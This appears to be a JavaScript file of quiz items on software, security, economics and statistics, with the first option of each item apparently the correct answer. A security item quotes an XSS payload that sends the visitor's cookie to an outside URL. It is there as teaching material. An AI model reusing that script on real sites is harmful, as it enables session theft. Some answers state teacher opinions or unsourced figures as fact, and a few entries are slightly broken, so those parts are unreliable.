        ["DemoController", "mocked (like a crash test dummy)"],
        ["SuperComputer", "instantiated (an actual super computer is used)"],
        ["Assertions", "mocked (like a crash test dummy)"],
        ["DemoControllerTest", "mocked (like a crash test dummy)"]
      ])
  ]
);
addSingleQuestionToMath(
  null,
  "Regarding the running of applications, the prime %s of using Docker %s.",
  [
    ["advantages", "include consistent setup and scalability"],
    ["disadvantage", "is Windows vendor lock-in"],
    ["goal", "is reliable encryption"],
    ["substructures", "compartments and a containment field"],
    ["business benefits", "include greater market share and profit margins"]
  ]
);
addSingleQuestionToMath(
  null,
  "In Docker, an image is a blueprint for %s and a container is a %s.",
  [
    ["running an application on a virtual operating system", "running instance of an image"],
    ["creating an architectural diagram of computer", "a group of images"],
    ["creating media files", "a group of images"],
    ["the authorization certificate and its public-key signature", "web server that uses them"],
    ["managing costs", "web server that gives current information on financing"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "Consider the following file -",
      "",
      "FROM adoptopenjdk/openjdk11:jdk-11.0.7_10-alpine",
      "COPY target/demo-0.0.1-SNAPSHOT.jar .",
      "CMD java -jar demo-0.0.1-SNAPSHOT.jar"
    ]),
  [
    createSingleQuestion(
      "This file is a %s which is used to create Docker %s.",
      [
        ["Dockerfile", "images"],
        ["Dockerfile", "containers"],
        ["pom.xml", "containers"],
        ["Makefile", "images"],
        ["Makefile", "containers"],
      ]
    ),
    createSingleQuestion(
      "This will %s.",
      [
        ["select a Java-enabled operating system, add a Java application to it, then run that application"],
        ["compile a Java program then run it locally"],
        ["use Windows to spawn a subprocess that will compile the Java application and upload it for others to use"],
        ["select Alpine Linux then run several Unix commands in it"],
        ["do nothing"],
      ]
    )
  ]
);
addSingleQuestionToMath(
  null,
  "The Unix commands 'cd .', 'cd ..', 'cd ~', and 'cd /' will change the shell's current directory to %s.",
  [
    ["the current directory (no change), the parent directory, the user's home directory, and the root directory, respectively"],
    ["the parent directory, the current directory (no change), the user's home directory, and the root directory, respectively"],
    ["the user's home directory, the current directory (no change), the parent directory, and the root directory, respectively"],
    ["the root directory, the current directory (no change), the parent directory, and the user's home directory, respectively"]
    ["the parent directory, the parent directory, the user's home directory, and the root directory, respectively"],
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Consider the consequences of running the following two Unix commands -",
      "",
      "export FOOD=pizza",
      "echo \"My favorite food is ${FOOD}\""
    ]),
  "These commands will print 'My favorite food is pizza' using the 'FOOD' %s. Using %s is a common way of customizing the same %s for different situations.",
  [
    ["environment variable", "environment variables", "Docker image"],
    ["Java property", "Java properties", "Docker image"],
    ["request parameter", "request parameters", "certificate"],
    ["request header", "request headers", "certificate"],
    ["stack entry", "stack entries", "certificate"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Consider the following file -",
      "",
      "STUDENT_NAME,AGE,GRADE",
      "Sally,16,B",
      "Ahmad,17,A",
      "Jane,16,A+",
      "Chin,16,B-"
    ]),
  "This is a %s file which is good for %s.",
  [
    ["CSV (Comma-Separated Value)", "transferring data between unrelated systems"],
    ["CSV (Comma-Separated Value)", "formatting text with unusual characters"],
    ["tab-delimited", "presenting data in such a way that it isn't obvious"],
    ["tab-delimited", "formatting text with unusual characters"],
    ["CSV (Comma-Separated Value)", "presenting data in such a way that it isn't obvious"]
  ]
);
addSingleQuestionToMath(
  null,
  "The %s value of a database entry is what %s it.",
  [
    ["primary key", "uniquely identifies"],
    ["foreign key", "uniquely identifies"],
    ["foreign key", "deletes"],
    ["foreign key", "copies"],
    ["primary key", "copies"]
  ]
);
addPartToMath(
  createPreamble(
    null,
    [
      "In MySQL the following two tables have been created -",
      "",
      "CREATE TABLE accounts (",
      "    id MEDIUMINT NOT NULL,",
      "    name CHAR(30) NOT NULL,",
      "    PRIMARY KEY (id)",
      ");",
      "",
      "CREATE TABLE transactions (",
      "    amount DECIMAL(6,2) NOT NULL,",
      "    account_id MEDIUMINT NOT NULL,",
      "    FOREIGN KEY (account_id)",
      "        REFERENCES accounts(id)",
      ");",
      "",
      "You successfully issue all of the following SQL commands -",
      "SET autocommit = 0;",
      "INSERT INTO accounts(id, name) values (1, 'Gary');",
      "INSERT INTO transactions(amount, account_id) VALUES (100, 1);",
      "INSERT INTO transactions(amount, account_id) VALUES (-9, 1);",
      "commit;",
      "select SUM(amount) from accounts, transactions where accounts.id = transactions.account_id and accounts.name = 'Gary';"
    ]),
  [
    createSingleQuestion(
      "This output of the '%s' statement will be %s.",
      [
        ["select", "91"],
        ["commit", "91"],
        ["select", "100"],
        ["select", "-9"],
        ["select", "0"],
      ]
    ),
    createSingleQuestion(
      "The 'from accounts, transactions' part of the 'select' statement represents a '%s'.",
      [
        ["table join"],
        ["data jam"],
        ["data merge"],
        ["compound select"],
        ["double aggregation"],
      ]
    ),
    createSingleQuestion(
      "The first 'INSERT INTO transactions' statement successfully executes but you immediately exit MySQL. The data added by that 'INSERT' statement will %s.",
      [
        ["not be saved in the database and it won't be visible to anyone because the 'commit' statement wasn't issued"],
        ["will be visible to everyone because all data from 'INSERT' statements are immediately visible to everyone"],
        ["not be saved in the database and it won't be visible to anyone because the next 'INSERT' statement wasn't issued"],
        ["not be saved in the database and it won't be visible to anyone because the 'SELECT' statement wasn't issued"],
        ["not be saved in the database and it won't be visible to anyone because the table's permanence flag wasn't enabled"]
      ]
    )
  ]
);
addSingleQuestionToMath(
  null,
  "In AWS DynamoDB, %s database, an optional field %s need to be defined at the time a table is created.",
  [
    ["a NoSQL", "does not"],
    ["an SQL", "does not"],
    ["a graph", "does not"],
    ["a NoSQL", "does"],
    ["an SQL", "does"]
  ]
);
addSingleQuestionToMath(
  null,
  "The key components of security are %s.",
  [
    ["authorization, authentication, auditing, and encryption"],
    ["certification, internal reviews, budgets, and authorization"],
    ["training, experience, auditing, and assignments"],
    ["authentication, metrics, processes, and internal reviews"],
    ["certification, encryption, training, and experience"]
  ]
);
addSingleQuestionToMath(
  null,
  "OAuth2 is %s protocol for %s.",
  [
    ["an authorization", "granting access to web services and allowing third-party authentication (like logging into Facebook to access TikTok)"],
    ["an HTTP", "posting user information"],
    ["a SAML", "single sign-on"],
    ["a DHCP", "assigning an IP address after login"],
    ["a TCP", "for auditing"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "You've logged in to AWS Cognito and received a JWT (JSON Web Token).",
      "",
      "You want to extract the OAuth2 access token.",
    ]),
  "To get the token, extract the content %s, %s what you've extracted, then get the token from the content (which is probably a JSON object).",
  [
    ["between the two periods", "base64-decode"],
    ["to the left of the first period", "base64-decode"],
    ["between the two periods", "decrypt"],
    ["to the left of the first period", "decrypt"],
    ["to the right of the second period", "decrypt"]
  ]
);
addSingleQuestionToMath(
  null,
  "A CAPTCHA attempts to determine whether the user %s.",
  [
    ["is a person or a bot"],
    ["has administrative rights"],
    ["is logged in"],
    ["has exceed the usage limit"],
    ["is from the same country as the web application"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "An AWS user is assigned a policy with this definition.",
      "",
      "{",
      "    \"Version\": \"2012-10-17\",",
      "    \"Statement\": [",
      "        {",
      "            \"Effect\": \"Allow\",",
      "            \"Action\": \"s3:*\",",
      "            \"Resource\": \"*\"",
      "        }",
      "    ]",
      "}",
    ]),
  "This user %s be able to do %s to %s S3 resources.",
  [
    ["will", "anything", "any"],
    ["will not", "anything", "any"],
    ["will", "some things", "any"],
    ["will", "anything", "some"],
    ["will", "some things", "some"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "Public-key encryption relies on the observation that it's much easier to find two large prime numbers (private keys) to multiply together than it is to factorize the product (public key) of the two prime numbers."
    ]),
  "The product of the two prime numbers %s. The prime numbers that are factors in the product %s.",
  [
    ["can and should be released to the public", "definitely shouldn't be released to the public"],
    ["can and should be released to the public", "can and should be released to the public"],
    ["definitely shouldn't be released to the public", "definitely shouldn't be released to the public"],
    ["definitely shouldn't be released to the public", "can and should be released to the public"],
    ["can and should be released to the public", "should be immediately deleted"]
  ]
);
addSingleQuestionToMath(
  null,
  "When initiating an HTTPS connection, a browser will %s.",
  [
    ["accept a certificate signed by a global certificate authority and reject a self-signed certificate"],
    ["reject both a certificate signed by a global certificate authority and a self-signed certificate"],
    ["accept both a certificate signed by a global certificate authority and a self-signed certificate"],
    ["accept a self-signed certificate and reject a certificate signed by a global certificate authority"],
    ["send a certificate for the server to use if the server doesn't already have one"]
  ]
);
addSingleQuestionToMath(
  null,
  "Both hashing and encryption %s, but hashes differ in that they %s.",
  [
    ["scramble things up and provide consistent output", "can't be unscrambled and tend to always have the same output size no matter what the input is"],
    ["require an encryption key and a self-signed certificate", "can be decrypted and always have different output for the same input"],
    ["scramble things up and provide consistent output whose size varies by the length of the input", "can be decrypted by a self-signed certificate with private key"],
    ["provide user security", "can be decrypted"],
    ["produce output that the user can easily interpret", "produce output whose length is proportional to the input"]
  ]
);
addSingleQuestionToMath(
  null,
  "Hashing is very good for %s.",
  [
    ["determining whether two files are the same without comparing them byte-by-byte"],
    ["encryption"],
    ["ensuring that the user has logged out of a system by letting the session cookie expire"],
    ["providing intuitive content in a user interface"],
    ["setting HTTP request parameters"]
  ]
);
addSingleQuestionToMath(
  createPreamble(
    null,
    [
      "A user posts the following comment on a video-game review web site.",
      "",
      "        Gimme your session token in 5 seconds.",
      "        <script>",
      "          setTimeout(",
      "            function() {",
      "              window.location.href = \"https://postman-echo.com/get?userSession=\" + document.cookie;",
      "            },",
      "            5000",
      "          );",
      "        </script>"
    ]),
  "The user is trying to initiate %s attack which can be defended against %s.",
  [
    ["an XSS (Cross-Site Scripting)", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
    ["a CSRF (Cross-Site Request Forgery)", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
    ["an SQL injection", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
    ["an SQL injection", "if CSRF tokens are used"],
    ["a CSRF (Cross-Site Request Forgery)", "if CSRF tokens are used"]
  ]
);
addSingleQuestionToMath(
  null,
  "A 'brute-force' attack tries to %s. A 'denial-of-service' attack tries to %s.",
  [
    ["attempt all combinations of something (like a password)", "overwhelm a web site with bogus web calls"],
    ["overwhelm a web site with bogus web calls", "attempt all combinations of something (like a password)"],
    ["physically damage hardware", "change the access permissions of users so that none of them can access the web site"],
    ["downgrade HTTPS to HTTP", "change the IP address of the caller"],
    ["resign a server's certificate with a dubious third party", "strips session tokens from the caller"]
  ]
);
//Verbal
addPartToVerbal(
  createPreamble(
    [
      "Reference - https://www.bloomberg.com/opinion/articles/2019-11-12/millennials-approach-middle-age-without-benefit-of-economic-boom"
    ],
    [
      "Article entitled 'Millennials on the Cusp of Middle Age Missed Their Boom' -",
      "",
      "\"...",
      "Why have so many millennials experienced failure to launch? ...",
      "...",
      "So for many aging millennials, the lifestyle of extended adolescence -- living with parents or roommates, finding dates <casually>, starting relationships and breaking up again -- <part removed>\"",
    ]),
  [
    createSingleQuestion(
      "The term 'failure to launch' means %s.",
      [
        ["a young adult that hasn't become self-sufficient yet"],
        ["a Google search that hasn't completed"],
        ["a company not matching an employees retirement contribution"],
        ["a failed production deployment"],
        ["a signed rental lease that hasn't started yet"]
      ]),
    createSingleQuestion(
      "The '<part removed>' represents '%s'",
      [
        ["is probably beginning to seem less like a never-ending party than a trap."],
        ["an improvement over previous generations."],
        ["allows them to pay off student-loan debt more quickly."],
        ["makes them the most social generation ever."],
        ["prevents them from saving more money for retirement."]
      ])
  ]
);
addSingleQuestionToVerbal(
  null,
  "Considering the Rule of 72, things having yearly compound interests of 2, 6, and 12 percent will double in size after %s, %s, and %s years, respectively.",
  [
    ["36", "12", "6"],
    ["1", "2", "4"],
    ["10", "5", "1"],
    ["8", "4", "2"],
    ["40", "25", "10"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote Attributed to Albert Einstein -"
    ]),
  "'Compound interest is %s.'",
  [
    ["the most powerful force in the universe"],
    ["the path to riches"],
    ["for egghead accountants, study physics instead"],
    ["the fundamental difference between mass and energy"],
    ["too simplistic for my mind"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.marketwatch.com/story/in-this-depressing-and-all-too-common- scenario-you-may-need-to-sock-away-44-of-your-income-for-retirement-2019-11-13"
    ],
    [
      "Consider how much of your annual income that you would need to save to retire at a certain age with the same standard of living."
    ]),
  "For age 65, you would need to save %s if you started at age 25, %s if you started at age 35, and %s if you started at age 45.",
  [
    ["15%", "24%", "44%"],
    ["10%", "30%", "50%"],
    ["15%", "35%", "90%"],
    ["20%", "25%", "30%"],
    ["14%", "30%", "45%"]
  ]
);
addPartToVerbal(
  createPreamble(
    null,
    [
      "Reference - Informed Opinion of Teacher"
    ]),
  [
    createSingleQuestion(
      "As of 2019, a typical annual salary for a %s in the Philadelphia area is around %s.",
      [
        ["senior software developer", "$120K"],
        ["senior software developer", "$70K"],
        ["senior software developer", "$300K"],
        ["junior software developer", "$120K"],
        ["senior software developer", "$200K"]
      ]),
    createSingleQuestion(
      "About %s of CS degree holders are no longer programming by age %s.",
      [
        ["80%", "40"],
        ["80%", "25"],
        ["20%", "60"],
        ["20%", "40"],
        ["20%", "50"]
      ])
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote from Bill Gates -"
    ]),
  "'K-12 is partly about %s.'",
  [
    ["babysitting the kids so the parents can do other things"],
    ["social development because that really matters in the long run"],
    ["ecology since future generations will judge us by how we treated the Earth"],
    ["extracurricular activities"],
    ["inspiring students to be the leaders of tomorrow"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Observation of Teacher -"
    ]),
  "The Great Pyramids are marvelous to behold %s.",
  [
    ["but, for most of its workers, they weren't fun to build"],
    ["and a gateway to the sky"],
    ["and a testament to humanities greatness"],
    ["but the greatness of Africa lies far beyond them in the Serengeti"],
    ["especially just after the sun rises"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Opinion of Teacher -"
    ]),
  "(%s, living on one’s own, %s) > (having fun, living with parents, %s)",
  [
    ["Bored", "establishing a life", "saddled with student-loan debt"],
    ["Unemployed", "hungry", "looking for a job"],
    ["About to get fired", "tired", "studying for the AFQT"],
    ["Left the country on a whim", "obtained a car loan", "studying a marketable skill in school"],
    ["Studying history", "recently arrested", "helping a family member"]
  ]
);
addPartToVerbal(
  createPreamble(
    null,
    [
      "Reference - 50 Inventions that Shaped the Modern Economy"
    ]),
  [
    createSingleQuestion(
      "The introduction of the washing machine %s, because %s.",
      [
        ["didn't save time", "people just decided to wash clothes more frequently"],
        ["saved time", "the machine did the work for them"],
        ["triggered international conflicts", "their construction lead to metal shortages"],
        ["sunk a famous ship", "they were too heavy"],
        ["caused a significant economic contraction", "those who worked at laundromats lost their jobs"]
      ]),
    createSingleQuestion(
      "%s eating is more likely to involve eating %s than %s.",
      [
        ["Impulsive", "junk food", "something nutritious"],
        ["Planned", "junk food", "something nutritious"],
        ["Impulsive", "nutritious food", "junk food"],
        ["Restricted", "a variety of things", "just a few"],
        ["Vegan", "dairy products", "kale"]
      ]),
    createSingleQuestion(
      "TV dinner and related inventions changed the economy in two important ways - %s but also %s.",
      [
        ["freed women from hours of domestic chores further enabling them to pursue careers", "increased obesity"],
        ["it imposed the gold standard", "decreased foreign trade"],
        ["decreased possibilities for women to obtain an education", "lowered automobile usage"],
        ["directly stimulated the internet", "increased the popularity of mainframes"],
        ["lowered automobile usage", "increased interest in nuclear power"]
      ])
  ]
);
addPartToVerbal(
  createPreamble(
    ["Source - https://www.inc.com/quora/why-salespeople-get-paid-more-than-engineers.html"],
    [
      "Title - Why do sales people get paid more than software engineers / developers?",
      "",
      "...",
      "Engineers get more and more productive and essentially work themselves out of a job. As a company scales, revenue per engineer should skyrocket. But salespeople do not get much more productive and revenue for salesperson is much more constant over time. That means that <end of first paragraph>.",
      "...",
      "Additionally, very few people want to be salespeople. ... And salespeople are the first people to get fired -- it is a super stressful what-have-you-done-for-me-lately job. The job can be a grind. So the only way to recruit people to the job is <end of second paragraph>.",
      "...",
      "So while engineers still earn less cash comp than salespeople, that <end of third paragraph>.",
      "..."
    ]),
  [
    createSingleQuestion(
      "The '<end of first paragraph>' value should be '%s'.",
      [
        ["salespeople are always in demand"],
        ["salespeople need more training"],
        ["salespeople should blame themselves for not being more productive"],
        ["productivity determines how much people get paid"],
        ["engineers should intentionally become less productive"]
      ]),
    createSingleQuestion(
      "The '<end of second paragraph>' value should be '%s'.",
      [
        ["to pay more"],
        ["to make the job less stressful"],
        ["to advertise more"],
        ["to hire younger people"],
        ["to hire more recruiters"]
      ]),
    createSingleQuestion(
      "The '<end of third paragraph>' value should be '%s'..",
      [
        ["difference is narrowing"],
        ["engineering will always be a better job"],
        ["will always be the way it is"],
        ["is the way it should be"],
        ["engineering will always be more noble"]
      ])
  ]
);
addSingleQuestionToVerbal(
  createPreamble(["Reference - https://shortstoriesshort.com/story/the-emperors-new-clothes/"], null),
  "A major theme of \"The Emperor's New Clothes\" is that %s.",
  [
    ["people don't want to admit the obvious if does so will hurt them socially"],
    ["even just emperors risk being embarrassed when marching in a parade"],
    ["making clothes for powerful people is a great way to make a living"],
    ["power can be obtained by dressing well"],
    ["wearing a new set of clothes can change people's opinion of you"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "The Four Great Inventions of Chinese Civilization are %s, %s, %s, and %s.",
  [
    ["compass", "gunpowder", "printing press", "press"],
    ["dancing", "storytelling", "sports", "drama"],
    ["plow", "number zero", "stirrup", "irrigation"],
    ["The Great Wall", "The Three Gorges Dam", "civil-service exams", "kites"],
    ["light bulb", "steam engine", "semiconductors", "trial by jury"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "The Industrial Revolution was a sustained period of technological and economic progress which roughly started in %s and ended in about %s. It first happened in %s.",
  [
    ["1760", "1830", "England"],
    ["1610", "1650", "England"],
    ["1780", "1850", "America"],
    ["1680", "1750", "England"],
    ["1840", "1890", "Japan"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "When compared to other parts of the world, people living in Eurasia had the historic advantages of %s.",
  [
    ["many domesticable animal, a large east-west (similar climate) trading network, and greater exposure (therefore greater immunity) to disease"],
    ["favorable climate for aircraft, massive deposits of gemstones and precious metals, and clearer visibility of the night sky (crucial for navigation)"],
    ["closer to the Artic, closer to the Roman Empire, and closer to The Great Pyramids"],
    ["higher percentage of the population were farmers, pine wood was especially useful, and the altitude tended to be higher"],
    ["a history of poetry, mass adoption of the harpsichord, and Renaissance paintings"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "Compared with China, Europe was %s while also having %s.",
  [
    ["closer to the Americas", "greater geographic and political diversity"],
    ["further from the Americas", "greater geographic and political diversity"],
    ["closer to the Americas", "less geographic and political diversity"],
    ["further from the Americas", "less geographic and political diversity"],
    ["further from Africa", "greater geographic and political diversity"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "Compared to elsewhere, England had %s and %s just before it industrialized.",
  [
    ["cheap coal", "expensive labor"],
    ["expensive coal", "expensive labor"],
    ["cheap coal", "cheap labor"],
    ["expensive coal", "cheap labor"],
    ["cheap oil", "expensive labor"]
  ]
);
addPartToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's Opinion (but teacher doesn't know everything!)",
      "Title - How to Usefully Spend One's Early Adulthood",
      "",
      "Overall, for a tech career working at major corporations, teacher gave a rating breakdown of about 0.7 for Experiences, 0.3 for Family/Community, and 0.5 for Finances/Career .",
      "",
      "Individual experiences vary, but this rating breakdown is representative of a typical tech career working at major corporations.",
    ]),
  [
    createSingleQuestion(
      "'One has a budget of %s to distribute among each of these three domains with a maximum investment of %s in each.'",
      [
        ["1.5 units", "1 unit"],
        ["1.5 units", "0.5 units"],
        ["2 units", "1 units"],
        ["2 units", "2 units"],
        ["2 units", "1.5 units"]
      ]),
    createSingleQuestion(
      "Regarding Experiences, the teacher assigned a value of 0.7 in part because %s.",
      [
        ["you meet people from different cultures, the work constantly challenges you and proves you wrong, and you work in organizations of different sizes and industries"],
        ["you spend a lot of time working in the media industry and meeting with celebreties, you learn to speak foreign languages, and you take trips to exotic places to build internet infrastructure"],
        ["you take lots of plane trips and each at high-end restaurants"],
        ["you have a lot of freedom and independence when working in a corporate team"],
        ["you work in skyscrapers which have spectacular vantage points"]
      ]),
    createSingleQuestion(
      "Regarding Family/Community, the teacher assigned a value of 0.3 in part because %s.",
      [
        ["commute times are typically longer, work sometimes doesn't end after regular work hours, and harder to get back in labor force after leaving for an extended period"],
        ["the work is generally unsafe and does long-term psychological damage, people are annoyed by the internet and don't want to talk to you, and future children are treated like robots instead of people"],
        ["too much time is spent alone doing the work and it turns you into a recluse"],
        ["the constant keyboard usage causes long-term musculoskeletal damage"],
        ["you constantly work with offshore teams late into the evening and don't work normal daytime hours"]
      ]),
    createSingleQuestion(
      "Regarding Finances/Career, the teacher assigned a value of 0.5 in part because %s.",
      [
        ["the initial pay is good but it tends to plateau, you have some flexibility to pivot to other corporate jobs, and there's increased competition from foreigners and no licensing requirements"],
        ["you either hit it big at a startup or end up being paid below average"],
        ["most every engineer eventually starts a business and the fortunes of that venture can vary"],
        ["you will have a lower salary but a strong pension plan"],
        ["engineers generally get paid in stock options which have various outcomes"]
      ]),
    createSingleQuestion(
      "While many things fit into the categories (Experiences, Family/Community, Finances/Career), some things don't contribute to them and should be avoided including %s.",
      [
        ["being unemployed, staying in school too long without a career direction, living far away from family but not in an area one likes, and seeking to get married but in a relationship going nowhere"],
        ["driving a used car, buying a home for your family instead of renting, spending time with relatives, and getting technical certifications"],
        ["pursuing a master's degree, participating in your company's 401K program, joining a local gym to improve your fitness, and joining a local adult sports team to meet new people"],
        ["participating in a local civic or religious organization, caring for an elderly family member, visiting a foreign country to look at landmarks, and taking long weekend vacations to go hiking in the mountains"],
        ["learn to dance, study expense ratios of mutual funds, review nutritional data of food, and take a course at a local community college"]
      ])
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's experience working on software teams"
    ]),
  "Software engineering teams in America are about %s American, %s South Asian (typically Indian), and %s East Asian (typically Chinese).",
  [
    ["45%", "45%", "10%"],
    ["80%", "10%", "10%"],
    ["50%", "20%", "30%"],
    ["20%", "50%", "30%"],
    ["30%", "20%", "50%"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://hbr.org/2017/05/the-h-1b-visa-debate-explained"
    ], null),
  "'For example, [Indian outsourcing firms'] filings were for jobs paying %s. Companies like Amazon, Apple, Facebook, Google, and Microsoft mostly filed for jobs that paid %s.'",
  [
    ["between $60,000-$70,000 a year", "well above $100,000"],
    ["between $80,000-$100,000 a year", "well above $100,000"],
    ["minimum wage", "well above $100,000"],
    ["well above $100,000", "between $60,000–$70,000 a year"],
    ["well above $100,000", "between $80,000–$100,000 a year"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's Opinion"
    ]),
  "Try %s when choosing a career unless you have %s.",
  [
    ["not to be overly ideological", "strong religious or political beliefs"],
    ["to be ideological and uncompromising", "an emergency"],
    ["to be ideological and uncompromising", "parent who recommends a specific career"],
    ["to be ideological and uncompromising", "too much student-loan debt"],
    ["not to be overly ideological", "too much student-loan debt"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://howtheyplay.com/team-sports/What-are-the-Qualities-of-an-Elite-NFL-Quarterback"
    ],
    null),
  "'12 Characteristics of the Top-Level NFL Quarterbacks' include '%s' .",
  [
    ["able to read opponent's defensive schemes and anticipate their likely moves"],
    ["remaining composed and photogenic at press conferences"],
    ["getting along with teammates and the coaching staff"],
    ["participate in all pre-season activities including voluntary training camp sessions"],
    ["doing well academically"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Consider the following scenario - ",
      "",
      "You're not a dentist but are going for your annual cleaning confident that your teeth are in good shape.",
      "The dentist informs you that you need costly repair work, but your teeth are actually just fine and he just wants to earn more money to pay for his golf club membership."
    ]),
  "The dentist doing what's most beneficial for him instead of what's most beneficial for you (the person that hired him) is an example of '%s' . It's hard for you to know his true intentions because of '%s' .",
  [
    ["The Principal-Agent Problem", "Information Asymmetry"],
    ["The Medical Problem", "Psychic Blockage"],
    ["Greed", "Edward's Theorem"],
    ["Asymmetric Objectives", "Dental Public Relations"],
    ["Reposed Alignment", "Missing Itemized Statement"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Consider the following scenarios - ",
      "",
      "1) Not covering your mouth while coughing",
      "2) Polluting the environment",
      "3) Talking loudly in the library"
    ]),
  "Each of these is an example of '%s' because in each case your action didn't hurt you, but if everyone else did them too then you'd be worse off then if you'd never committed the action.",
  [
    ["The Prisoner's Dilemma"],
    ["Etiquette Fatigue"],
    ["Societal Shortcoming"],
    ["Environmental Dissonance"],
    ["Communal Disruption"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Job applicants often do the following even though the job doesn't require it - ",
      "",
      "1) List college degree on resume",
      "2) List volunteer work on resume",
      "3) Wear suit to interview",
      "",
      "Hiring employers often do the following even though they may lose job good candidates by doing so - ",
      "",
      "1) Reject those without a college degree",
      "2) Reject those with low credit scores",
      "3) Reject those with an arrest record"
    ]),
  "In these examples, the job applicants are engaging in '%s' while the hiring employers are engaging in '%s' .",
  [
    ["signalling", "screening"],
    ["preparation", "thoughtfulness"],
    ["apple-polishing", "miserliness"],
    ["fear", "gadflying"],
    ["ultra-caution", "ultra-caution"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote from Upton Sinclair -"
    ]),
  "It is %s to get [people] to %s something, when [their] %s depend on [them] %s it.",
  [
    ["difficult", "understand", "salaries", "not understanding"],
    ["easy", "understand", "salaries", "understanding"],
    ["a marvel", "say", "public images", "not saying"],
    ["easy", "do", "livelihoods", "doing"],
    ["impossible", "do", "others", "not prioritizing"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Jane is wearing a hat and about to enter into a room. Here is a probability distribution of the hat's color.",
      "",
      "- Dark Red - 30%",
      "- Dark Blue - 40%",
      "- Any Dark Color - 70%"
    ]),
  "This %s a valid probability distribution because %s.",
  [
    ["isn't", "the probabilities don't total 100% and 'Any Dark Color' overlaps with the other possibilities"],
    ["is", "the outcomes are clearly defined"],
    ["is", "the probability distribution concerns hat color and each possibility corresponds to hat color and nothing else"],
    ["is", "Jane is known for wearing dark-colored hats"],
    ["isn't", "the probability of a white hat isn't included"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "A lottery ticket costs $1 and one out of every 200 (0.005 likelihood) tickets wins $100."
    ]),
  "The expected cost (%s) %s the expected winnings (%s), so you %s buy one.",
  [
    ["100%*$1 = $1.00", "exceeds", "0.5%*$100 = $0.50", "should not"],
    ["0.5%*$100 = $0.50", "is less than", "100%*$1 = $1.00", "should"],
    ["$1", "is less than", "$100", "should"],
    ["$1", "is less than", "$200", "should"],
    ["100%*$100 = $100.00", "exceeds", "0.5%*$100 = $0.50", "should not"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "In a hat is a slip of paper for each of the following numbers (6 total slips) -",
      "",
      "- 4, 6, 4, 6, 4, 6"
    ]),
  "When drawing a single slip from the hat, its value will have a '%s' of %s and a '%s' of %s.",
  [
    ["mean", "5", "mean deviation", "1"],
    ["mean", "5", "mean deviation", "5"],
    ["mean", "5", "mean deviation", "2"],
    ["standard", "5", "standard deviation", "5"],
    ["standard", "5", "standard deviation", "2"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Claim - Playing Mozart music to an unborn baby will make the child smarter (as in doing better in school)."
    ]),
  "%s this relationship (correlation) is true, it %s mean that playing Mozart music causes children to become smarter because %s.",
  [
    ["While", "doesn't", "other factors (like better nutrition) which do make children smarter are more likely to be practiced by someone playing Mozart"],
    ["Since", "does", "correlation is causation"],
    ["Since", "does", "it follows human intuition that Mozart melodies would gently reshape the crude initial state of the brain into a more organized state"],
    ["While", "doesn't", "hip hop music is better"],
    ["Since", "does", "people in general who listen to Mozart tend to be smarter"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "You are about to flip a fair coin 10 times.",
      "",
      "Possible Outcome 1 - The first 5 flips will be heads and the last 5 flips will be tails",
      "Possible Outcome 2 - 5 of the flips will be heads, 5 of the flips will be tails",
      ""
    ]),
  "The probability that 'Possible Outcome 1' occurs is %s. The probability that 'Possible Outcome 2' occurs is %s.",
  [
    ["under 1%", "31.25%"],
    ["31.25%", "under 1%"],
    ["31.25%", "31.25%"],
    ["50%", "50%"],
    ["25%", "50%"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "A '%s' is very common %s in nature and %s is thought to be one.",
  [
    ["bell curve", "adult male height in the United States"],
    ["bell curve", "Olympic gold medals won by country"],
    ["power law distribution", "adult male height in the United States"],
    ["power law distribution", "blood pressure"],
    ["power law distribution", "the sum of several dice rolls"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.theatlantic.com/science/archive/2018/11/psychologys-replication-crisis-real/576223/"
    ],
    [
      "Topic - Replication Crisis in Psychology and Biases in Studies"
    ]),
  "The results from %s of psychology studies couldn't be replicated. '%s' like %s is a common problem among others to avoid when conducting a study.",
  [
    ["50%", "Selection Bias", "determining average height in society by using the height of basketball players"],
    ["100%", "Height Bias", "determining average height in society by using the height of basketball players"],
    ["0%", "Study Bias", "determining average height in society by measuring the height of randomly-selected people"],
    ["50%", "Study Bias", "determining average height in society by measuring the height of randomly-selected people"],
